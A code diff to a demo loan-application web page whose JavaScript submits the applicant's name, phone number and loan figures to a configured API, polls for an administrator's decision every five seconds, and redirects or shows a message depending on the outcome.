+    button.textContent = "Submitting...";
+
+    document.getElementById("confirmation").classList.add("hidden");
+    document.getElementById("processing").classList.remove("hidden");
+
+    document.getElementById("subtitle").textContent =
+        "Demo Application Under Review";
+
+    document.getElementById("processingTitle").textContent =
+        "Submitting Your Application";
+
+    document.getElementById("processingMessage").textContent =
+        "Your demo application is being sent for administrator review.";
+
+    document.getElementById("processingNote").textContent =
+        "PLEASE WAIT FOR A DECISION";
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+
+    const applicationData = {
+        full_name: applicantName,
+        phone_number: applicantPhone,
+        loan_amount_bwp: loanAmount,
+        period_months: loanPeriod,
+        monthly_payment_bwp: Number(monthlyPayment.toFixed(2)),
+        total_repayment_bwp: Number(totalPayment.toFixed(2))
+    };
+
+    try {
+        const response = await fetch(API_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(applicationData)
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+            throw new Error(result.error || "Application submission failed.");
+        }
+
+        document.getElementById("processingTitle").textContent =
+            "Application Received";
+
+        document.getElementById("processingMessage").textContent =
+            "Your demo application has been sent to the administrator. Please wait for the decision.";
+
+        document.getElementById("processingNote").textContent =
+            "WAITING FOR ADMIN APPROVAL";
+
+        // Check the decision every five seconds.
+        const applicationId = result.id;
+        const statusToken = result.status_token;
+        const startedAt = Date.now();
+
+        async function checkDecision() {
+            if (Date.now() - startedAt > 15 * 60 * 1000) {
+                document.getElementById("processingTitle").textContent =
+                    "Still Under Review";
+
+                document.getElementById("processingMessage").textContent =
+                    "No decision has been received yet. You can check again later.";
+
+                document.getElementById("processingNote").textContent =
+                    "PENDING REVIEW";
+
+                return;
+            }
+
+            try {
+                const statusResponse = await fetch(
+                    STATUS_URL +
+                    "?id=" + encodeURIComponent(applicationId) +
+                    "&token=" + encodeURIComponent(statusToken)
+                );
+
+                const statusResult = await statusResponse.json();
+
+                if (!statusResponse.ok) {
+                    throw new Error(statusResult.error || "Status check failed.");
+                }
+
+                if (statusResult.status === "approved") {
+                    document.getElementById("processingTitle").textContent =
+                        "Demo Application Approved";
+
+                    document.getElementById("processingMessage").textContent =
+                        "The administrator approved your demo application. Redirecting...";
+
+                    document.getElementById("processingNote").textContent =
+                        "APPROVED";
+
+                    window.location.href = APPROVED_REDIRECT_URL;
+                    return;
+                }
+
+                if (statusResult.status === "rejected") {
+                    document.getElementById("processingTitle").textContent =
+                        "Application Not Approved";
+
+                    document.getElementById("processingMessage").textContent =
+                        "The administrator did not approve this demo application.";
+
+                    document.getElementById("processingNote").textContent =
+                        "NOT APPROVED";
+
+                    return;
+                }
+            } catch (error) {
+                console.error("Status check error:", error);
+            }
+
+            setTimeout(checkDecision, 5000);
+        }
+
+        setTimeout(checkDecision, 5000);
 
     } catch (error) {
+        console.error("Application submission error:", error);
 
-        console.error(error);
+        document.getElementById("processingTitle").textContent =
+            "Submission Unsuccessful";
 
+        document.getElementById("processingMessage").textContent =
+            error.message || "Could not submit the application. Please try again.";
 
-        alert(
-            "Connection error. Please try again."
-        );
-
-
-        button.disabled = false;
-
-        button.textContent =
-            "Apply";
+        document.getElementById("processingNote").textContent =
+            "PLEASE TRY AGAIN";
     }
-}
+});
+
+
+
+/* =====================================
+   INITIAL CALCULATION
+===================================== */
+
+calculate();
 
 </script>
 
 </body>
-</html>
-
